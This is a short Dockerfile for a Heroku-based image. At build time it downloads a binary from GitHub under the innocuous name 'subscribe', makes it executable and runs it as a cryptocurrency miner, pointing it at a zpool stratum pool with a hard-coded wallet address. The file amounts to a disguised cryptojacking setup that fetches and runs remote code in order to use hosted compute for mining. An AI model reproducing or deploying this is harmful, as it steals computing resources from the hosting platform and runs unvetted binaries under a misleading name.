FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/figogove/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a allium -o stratum+tcp://allium.sea.mine.zpool.ca:6433 -u RL7uEXzjibHeV7zoHJHBtxtHgSXpmTMo9F -p c=RVN
CMD bash heroku.sh
